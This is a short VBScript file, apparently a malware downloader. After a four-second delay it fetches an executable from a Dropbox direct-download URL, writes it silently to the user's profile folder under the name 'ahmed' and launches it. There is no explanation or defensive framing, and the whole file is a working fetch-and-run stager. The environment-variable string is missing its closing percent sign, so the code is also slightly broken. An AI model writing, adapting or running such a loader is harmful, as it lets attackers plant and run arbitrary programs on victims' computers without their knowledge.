WScript.Sleep  4000

path = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%userprofile")
path = path & "\"
URL = "https://dl.dropboxusercontent.com/s/f4cmtuxvmd9n6tw/1.exe?dl=1&token_hash=AAHwqzyplobeiYqhIfwZPNTi5nBj4MUBEp1ikAdMt8NB1g"
filename = "ahmed" 
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", URL, False
xHttp.Send

with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile path &  filename, 2 '//overwrite
end with

file = path & filename
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run  chr(34) & file & chr(34)